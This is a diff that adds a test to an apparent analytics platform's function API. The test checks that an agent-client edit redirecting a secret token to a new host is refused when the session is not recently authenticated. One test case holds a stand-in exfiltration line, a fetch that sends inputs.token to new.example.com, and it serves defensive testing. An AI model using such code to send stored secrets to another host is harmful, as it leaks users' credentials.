@@ -1491,6 +1491,48 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             assert res.status_code == 200, res.json()
             assert HogFunction.objects.get(id=create.json()["id"]).encrypted_inputs["secret1"]["value"] == "I AM SECRET"
 
+    @parameterized.expand(
+        [
+            ("code_edit", "fetch('https://new.example.com', {'body': inputs.token});", 403),
+            ("same_code", "fetch(inputs.url, {'body': inputs.token});", 200),
+        ]
+    )
+    @SECRET_BINDING_ENFORCED
+    def test_an_agent_edit_next_to_a_secret_only_the_draft_holds_needs_recent_authentication(
+        self, _name: str, new_hog: str, expected_status: int
+    ) -> None:
+        create = self.client.post(
+            f"/api/projects/{self.team.id}/hog_functions/",
+            data={
+                "type": "destination",
+                "name": "Fetch URL",
+                "enabled": True,
+                "hog": "fetch(inputs.url, {'body': inputs.token});",
+                "inputs_schema": [
+                    {"key": "url", "type": "string", "label": "URL", "required": True},
+                    {"key": "token", "type": "string", "label": "Token", "secret": True, "required": False},
+                ],
+                "inputs": {"url": {"value": "https://example.com"}},
+            },
+        )
+        assert create.status_code == 201, create.json()
+        url = f"/api/projects/{self.team.id}/hog_functions/{create.json()['id']}"
+        mcp = {"x-posthog-client": "mcp"}
+        staged = self.client.patch(
+            url, data={"inputs": {"url": {"value": "https://example.com"}, "token": {"value": "STAGED"}}}, headers=mcp
+        )
+        assert staged.status_code == 200, staged.json()
+        draft_before = HogFunction.objects.get(id=create.json()["id"]).draft
+
+        self._age_session(settings.SESSION_INTEGRATION_LINK_AGE + 60)
+        res = self.client.patch(url, data={"hog": new_hog}, headers=mcp)
+
+        assert res.status_code == expected_status, res.json()
+        if expected_status == 403:
+            stored = HogFunction.objects.get(id=create.json()["id"])
+            assert stored.draft == draft_before
+            assert stored.draft_encrypted_inputs["token"]["value"] == "STAGED"
+
     @SECRET_BINDING_ENFORCED
     def test_moving_a_secret_dictionary_kept_entry_by_entry_needs_recent_authentication(self) -> None:
         payload = {
